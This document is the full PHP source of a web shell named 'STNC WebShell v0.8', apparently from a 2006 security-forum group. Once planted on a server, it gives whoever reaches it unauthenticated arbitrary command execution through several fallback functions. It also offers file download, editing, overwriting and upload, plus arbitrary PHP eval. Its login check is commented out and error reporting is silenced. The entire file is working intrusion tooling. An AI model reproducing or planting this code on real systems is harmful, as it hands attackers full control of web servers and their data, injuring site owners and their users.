<?php
$version = "0.8";
$vsplit = "style=\"border-right: #000000 1px solid;\"";
$hsplit = "style=\"border-bottom: #000000 1px solid;\"";
error_reporting(0);

if(version_compare(phpversion(),"4.1.0") == -1)
{ $_POST=&$HTTP_POST_VARS; }
if(get_magic_quotes_gpc())
foreach ($_POST as $k=>$v)
{ $_POST[$k] = stripslashes($v); }

/*
$login='root';
$hash='b1b3773a05c0ed0176787a4f1574ff0075f7521e'; // sha1("qwerty")

if(!(($_SERVER["PHP_AUTH_USER"]===$login)&&(sha1($_SERVER["PHP_AUTH_PW"])===$hash)))
{
header("HTTP/1.0 401 Unauthorized");
header("WWW-Authenticate: Basic");
die();
}
*/

function fe($s)
{return function_exists($s);}
function cmd($s)
{if(fe("exec")){exec($s,$r);$r=join("\n",$r);}
elseif(fe("shell_exec"))$r=shell_exec($s);
elseif(fe("system")){ob_start();system($s);$r=ob_get_contents();ob_end_clean();}
elseif(fe("passthru")){ob_start();passthru($s);$r=ob_get_contents();ob_end_clean();}
elseif(is_resource($f=popen($s,"r"))){$r="";while(!feof($f))$r.=fread($f,512);pclose($f);}
else $r=`$s`;return $r;}
function safe_mode_is_on()
{return ini_get('safe_mode');}
function str100($s)
{if(strlen($s)>100) $s=substr($s,0,100)."..."; return $s;}
function id()
{return str100(cmd("id"));}
function uname()
{return str100(cmd("uname -a"));}

function edit($size, $name, $val)
{ return "<input type=text size=$size name=$name value=\"$val\">"; }
function button($capt)
{ return "<input class=\"btn\" type=submit value=\"$capt\">"; }
function hidden($name, $val)
{ return "<input type=hidden name=$name value=\"$val\">"; }
function hidden_pwd()
{ global $location; return hidden("pwd",$location);}

$action_edit = false;

$printline = "";

if(isset($_POST["action"])) $action = $_POST["action"];
else $action = "cmd";

if(isset($_POST["pwd"]))
{ $pwd = $_POST["pwd"]; $type = filetype($pwd); if($type === "dir")chdir($pwd); else $printline = "\"$pwd\" - no such directory."; }

$location = getcwd();

if(($action === "download")&&(isset($_POST["fname"])))
{
  $fname = $_POST["fname"];
  if(file_exists($fname))
  {
    $pathinfo = pathinfo($fname);
    header("Content-Transfer-Encoding: binary");
    header("Content-type: application/x-download");
    header("Content-Length: ".filesize($fname));
    header("Content-Disposition: attachment; filename=".$pathinfo["basename"]);
    readfile($fname);
    die();
  }
  else
    $printline = "\"$fname\" - download failed.";
}

echo "<head><style>input {border: black 1px solid; background-color: #dfdfdf; font: 8pt verdana;}
textarea {background-color:#dfdfdf; scrollbar-face-color: #dfdfdf; scrollbar-highlight-color: #dfdfdf;
scrollbar-shadow-color: #dfdfdf; scrollbar-3dlight-color: #dfdfdf; scrollbar-arrow-color: #dfdfdf; scrollbar-track-color: #dfdfdf;
scrollbar-darkshadow-color: #dfdfdf; border: black 1px solid; font: fixedsys bold; }
td {padding:0;} body {margin: 0; padding: 0; background-color: #cfcfcf;} a {color:black;text-decoration:none;}
.btn {background-color: #cfcfcf;} .pad {padding:5;}
</style><title>  STNC WebShell v$version  </title></head><body><table width=100%>
<tr><td $hsplit><table><tr><td $vsplit><b>&nbsp;&nbsp;STNC&nbsp;WebShell&nbsp;v$version&nbsp;&nbsp;</b></td><td>id: ".id()."<br>uname: ".uname()."<br>your ip: ".$_SERVER["REMOTE_ADDR"]." - server ip: ".gethostbyname($_SERVER["HTTP_HOST"])." - safe_mode: ".((safe_mode_is_on()) ? "on" : "off")."</td></tr></table></tr></td>
<tr><form method=post><td class=\"pad\" colspan=2 $hsplit><center>".hidden("action","save").hidden_pwd()."<textarea cols=120 rows=16 wrap=off name=data>";

echo htmlspecialchars($printline)."\n";

if($action === "cmd")
{
  if(isset($_POST["cmd"]))
    $cmd = $_POST["cmd"];
  else
    $cmd = "ls -la";

  $result = htmlspecialchars(cmd($cmd));

  if($result === "")
    $result = cmd("ls -la");

  echo $result;
  $location = getcwd();
}
elseif(($action === "edit")&&(isset($_POST["fname"])))
{
  $fname = $_POST["fname"];
  ob_start();

  if(!readfile($fname))
    echo "Cann't open file \"$fname\".";
  else
    $action_edit = true;

  $result = ob_get_clean();
  ob_end_clean();
  echo htmlspecialchars($result);
}
elseif(($action === "save")&&(isset($_POST["fname"]))&&(isset($_POST["data"])))
{
  $fname = $_POST["fname"];
  $data = $_POST["data"];
  $fid = fopen($fname, "w");
  $fname = htmlspecialchars($fname);

  if(!$fid)
    echo "Cann't save file \"$fname\".";
  else
  {
    fputs($fid, $data);
    fclose($fid);
    echo "File \"$fname\" is saved.";
  }
}
elseif(($action === "upload")&&(isset($_FILES["file"]))&&(isset($_POST["fname"])))
{
  $fname = $_POST["fname"];
  if(copy($_FILES["file"]["tmp_name"], $fname))
    echo "File \"$fname\" is uploaded.\nFile size: ".filesize($fname)." bytes.";      
  else
    echo "Upload failed!";
}
elseif(($action === "eval")&&(isset($_POST["code"])))
{
  $code = $_POST["code"];
  ob_start();
  eval($code);
  $result = ob_get_clean();
  ob_end_clean();
  echo htmlspecialchars($result);
}

echo "</textarea>".(($action_edit) ? "<br>".button("  Save  ").hidden("fname",$fname):"")."</center></td></form></tr>
<tr><form method=post><td class=\"pad\" $hsplit><center>".hidden("action","cmd")."<table><tr><td width=80>Command:&nbsp;</td><td>".edit(85,"cmd","")."</td></tr><tr><td>Location:&nbsp;</td><td>".edit(85,"pwd",$location)."&nbsp;".button("Execute")."</td></tr></table></center></td></form></tr>
<tr><form method=post><td class=\"pad\" $hsplit><center>".hidden("action","edit").hidden_pwd()."<table><tr><td width=80>Edit file:</td><td>".edit(85,"fname",$location)."</td><td>".button("    Edit    ")."</td></table></center></td></form></tr>

<tr><form method=post><td class=\"pad\" $hsplit><table width=100%><tr><td width=50% $vsplit>".
  hidden("action","download").hidden_pwd()."<center><table><tr><td width=80>File:</td><td>".edit(50,"fname",$location)."</td><td>".button("Download")."</td></tr></table></center>
</td></form><form method=post enctype=multipart/form-data><td class=\"pad\" width=50%>".
  hidden("action","upload").hidden_pwd()."<center><table><tr><td width=80>File:</td><td><input type=file size=50 name=file></td></tr><tr><td>To file:</td><td>".edit(50,"fname",$location)."&nbsp;".button("Upload")."</td></tr></table></center>
</td></tr></table></td></form></tr>

<tr><form method=post><td class=\"pad\" $hsplit>".hidden("action","eval").hidden_pwd()."<center><textarea cols=100 rows=4 wrap=off name=code></textarea><br>".button("   Eval   ")."</center></td></form></tr>
<tr><td align=right>Coded by drmist | <a href=\"http://drmist.ru\">http://drmist.ru</a> | <a href=\"http://www.security-teams.net\">http://www.security-teams.net</a> | <a href=\"http://www.security-teams.net/index.php?showtopic=3429\">not enough functions?</a> | (c) 2006 [STNC]</td></tr></table></body>";
?>